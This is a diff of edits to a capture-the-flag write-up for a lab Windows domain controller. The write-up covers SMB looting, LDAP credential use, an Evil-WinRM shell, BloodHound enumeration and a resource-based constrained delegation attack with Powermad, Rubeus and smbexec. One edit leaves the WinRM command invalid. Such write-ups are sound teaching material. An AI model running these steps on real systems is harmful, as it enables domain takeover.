@@ -89,7 +89,7 @@ do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-The ‘support-tools’ share looks enticing so lets jump right to that one and take a look. Once connected we will list the contents. The ‘UserInfo.exe.zip’ file looks like it may be of interest so lets get that to our local machine and take a look at it.
+The ‘support-tools’ share looks enticing so lets jump right to that one and take a look. Once connected we will list the contents. The ‘UserInfo.exe.zip’ file looks like it may be of interest so lets get that and take a look at it on our local machine.
 
 ```text-plain
 smbclient -N \\\\10.10.11.174\\support-tools
@@ -117,7 +117,7 @@ Once we have the UserInfo.exe binary on our host system we can move it to a wind
 
 ![image](https://user-images.githubusercontent.com/110564012/235828131-3dbab6ac-8028-48b2-8340-fef0d818967b.png)
 
-We will run the following code in pycharm which will return the decoded password.
+Since we're already using a Windows VM I will run the following code in pycharm which will return the decoded password.
 
 ```text-plain
 import base64
@@ -147,7 +147,7 @@ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 LDAP Enumeration
 ----------------
 
-Now that we have this LDAP credential we can run an LDAP query on the target. In the output the info field contains what appears to be a plaintext password.
+Now that we have this LDAP credential we can run an LDAP query on the target. The *info* field contains what appears to be a plaintext password.
 
 ```text-plain
 ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
@@ -201,7 +201,7 @@ Shell Access Using EvilWinRM
 Lets try that credential out with the support account using EvilWinRM on our target. Hey, it works! We now have shell access on the target as the support account.
 
 ```text-plain
-evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
+*Evil-WinRM* -i support.htb -u support -p 'Ironside47pleasure40Watchful'
 
 pwd
 
@@ -214,7 +214,7 @@ C:\Users\support\Documents
 
 ```text-plain
 cat user.txt
-155cd7d81dedd2e1d8dfd6406d9b4c3c
+HTB{********************************}
 ```
 
 AD Enumeration With Sharphound/Bloodhound
@@ -226,7 +226,7 @@ Sharphound: [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](
 
 Bloodhound: [https://github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
 
-As we wont be using evasion techniques running sharphound on the target is simply a matter of uploading the binary to our target using our EvilWinRM shell and executing it. Bloodhound will be used on our local machine to visually graph our target environment using the info we collected with sharphound. This takes a bit of setup which I will not cover here, I would recommend using this guide to complete the initial Neo4j and Bloodhound setup: [https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu](https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu)
+As we wont be using evasion techniques running sharphound on the target is simply a matter of uploading the binary to our target using EvilWinRM and executing it. Bloodhound will be used on our local machine to visually graph our target environment using the info we collected with sharphound. This takes a bit of setup which I will not cover here, I would recommend using the following guide to complete the initial Neo4j and Bloodhound setup: [https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu](https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu)
 
 ```text-plain
 *Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/Desktop/HTB/Machines/support/SharpHound.exe
@@ -257,7 +257,7 @@ Now that sharphound has been uploaded and we have verified on the target we can 
 Once its done we will need to download the zip file that it created to our local machine so we can load it into bloodhound.
 
 ```text-plain
-C:\Users\support\Documents> download 20230403164937_BloodHound.zip
+*Evil-WinRM* PS C:\Users\support\Documents> download 20230403164937_BloodHound.zip
 ```
 
 Back on our local machine we will open bloodhound in a browser and simply drag the zip file in and drop it. Use the queries in the menu to enumerate the AD environment and discover relationships between accounts. 
@@ -267,7 +267,7 @@ Back on our local machine we will open bloodhound in a browser and simply drag t
 Constrained Delegation Attack
 -----------------------------
 
-We notice that shared support accounts have generic all permission on the DC and support (which we own) has generic all on account operators. This means that we may be able to add a new computer object to the environment, generate a password hash, and request kerberos tickets that we can use for impersonating an administrator account. This type of attack is called Resource-based Constrained Delegation. More info can be found at this link: [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
+We notice that shared support accounts have *generic all* permission on the DC and the *support* account (which we own) has *generic all* on account operators. This means that we may be able to add a new computer object to the environment, generate a password hash, and request kerberos tickets that we can use for impersonating an administrator account. This type of attack is called Resource-based Constrained Delegation. More info can be found at this link: [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
 
 We will need a few tools to perform this attack.
 
@@ -277,7 +277,7 @@ git clone https://github.com/Kevin-Robertson/Powermad.git
 git clone https://github.com/GhostPack/Rubeus.git
 ```
 
-Using the EvilWinRM shell that we have on the target upload powermad and rubeus.
+Using EvilWinRM upload the powermad and rubeus tools to the target.
 
 ```text-plain
 *Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/Desktop/HTB/Tools/Powermad/Powermad.ps1 pm.ps1
@@ -295,7 +295,7 @@ Then import powermad and set the variables we will need.
 *Evil-WinRM* PS C:\Users\support\Documents> Set-Variable -Name "targetComputer" -Value "DC"
 ```
 
-Now we can use powermad to add the new fake computer object to AD.
+Now we can use powermad to add the fake computer object to AD.
 
 ```text-plain
 *Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -306,13 +306,13 @@ Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
 [+] Machine account FAKE01 added
 ```
 
-Now use the built-in AD function to give the new computer object constrained delegation privilege.
+Now use the built-in AD function to give the fake computer object constrained delegation privilege.
 
 ```text-plain
 *Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
 ```
 
-With Rubeus, generate the new fake computer object password hashes. Since we created the computer object with the password 123456 we will need those hashes for the next step.
+With Rubeus, generate the fake computer object password hashes. Since we created the computer object with the password 123456 we will need to specify that in the request.
 
 ```text-plain
 *Evil-WinRM* PS C:\Users\support\Documents> ./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
@@ -357,12 +357,11 @@ We will need to set the local variable of KERB5CCNAME to pass the ccahe TGT file
 export KRB5CCNAME=administrator.ccache
 ```
 
-And finally we can use impacket's smbexec.py tool to connect to the target using the TGT we aquired to impersonate the administrator account. 
-
 Privileged Shell Access
 -----------------------
+Lastly we can use impacket's smbexec.py tool to connect to the target using the TGT we aquired to impersonate the administrator account. 
 
-Once connected we can check what account we are controlling and we see that we are indeed logged in as the system account. Navigate around and find any files of interest. The root flag can be found at ‘C:\\Users\\administrator\\Desktop\\root.txt’
+Once connected we can check what account we are controlling and we see that we are indeed logged in as the *system* account. Navigate around and find any files of interest. The root flag can be found at ‘C:\\Users\\administrator\\Desktop\\root.txt’
 
 ```text-plain
 smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
@@ -385,7 +384,7 @@ C:\Windows\system32>dir c:\users\administrator\desktop
                2 Dir(s)   3,963,105,280 bytes free
 
 C:\Windows\system32>type c:\users\administrator\desktop\root.txt
-cf32650209795cc4a03e8e2b42c646b1
+HTB{********************************}
 ```
 
-Congratulations on completing this machine!
+Congratulations on completing this machine! Happy Hunting.
